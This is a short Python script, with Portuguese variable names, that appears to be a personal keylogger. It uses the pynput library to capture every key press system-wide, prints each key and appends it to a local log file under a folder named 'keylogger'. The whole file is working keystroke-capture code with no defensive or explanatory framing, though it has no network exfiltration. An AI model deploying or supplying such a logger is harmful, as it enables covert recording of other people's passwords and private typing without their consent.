from pynput.keyboard import Listener
import re

arquivoLog =  "C:/Users/jojos/Desktop/Atalhos/Python/keylogger/key.log"
def capturar(tecla):
	tecla = str(tecla)
	tecla = re.sub(r'/', '',tecla)
	tecla = re.sub(r'Key.space', ' ', tecla)


	print(tecla)

	with open(arquivoLog, "a") as log:
		log.write(tecla)

with Listener(on_press=capturar) as l:
	l.join()
